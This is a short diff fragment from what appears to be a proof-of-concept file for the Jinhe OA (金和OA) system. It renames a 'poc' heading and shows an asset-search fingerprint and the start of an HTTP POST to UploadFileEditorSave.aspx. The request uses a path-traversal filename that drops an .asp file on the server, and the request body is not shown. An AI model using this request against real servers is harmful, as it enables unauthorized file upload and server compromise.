@@ -7,7 +7,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\qps4cckjuz.asp HTTP/1.1
 Host: your_ip
